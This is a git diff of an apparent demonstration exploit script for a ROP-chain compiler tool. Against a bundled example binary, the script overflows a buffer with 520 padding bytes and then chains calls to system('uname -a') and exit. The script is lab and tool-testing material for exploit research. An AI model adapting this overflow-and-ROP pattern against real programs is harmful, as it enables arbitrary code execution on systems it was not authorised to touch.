@@ -4,14 +4,12 @@ from rop_compiler import ropme, goal
 
 filename = './example/bof_system'
 p = process([filename,'3000'])
-#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40071e\nbreak *system\nbreak *execve\nset follow-fork-mode child\ncatch syscall execve")
+#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40067f\nbreak *system\nbreak *exit")
 
 print "Using automatically built ROP chain"
 files = [(filename, None, 0)]
 uname_a_address = 0x400810 # address of the string "uname -a"
-exit_address = "0x400570" # the exit symbol's address isn't correct when found by pyelftools, so we need to get it ourselves
-goal_resolver = goal.create_from_arguments(files, [], [["function", "system", uname_a_address], ["function", exit_address, 33]])
-rop = ropme.rop(files, goal_resolver)
+rop = ropme.rop(files, [], [["function", "system", uname_a_address], ["function", "exit", 33]], log_level = logging.DEBUG)
 
 payload = 'A'*512 + 'B'*8 + rop
 
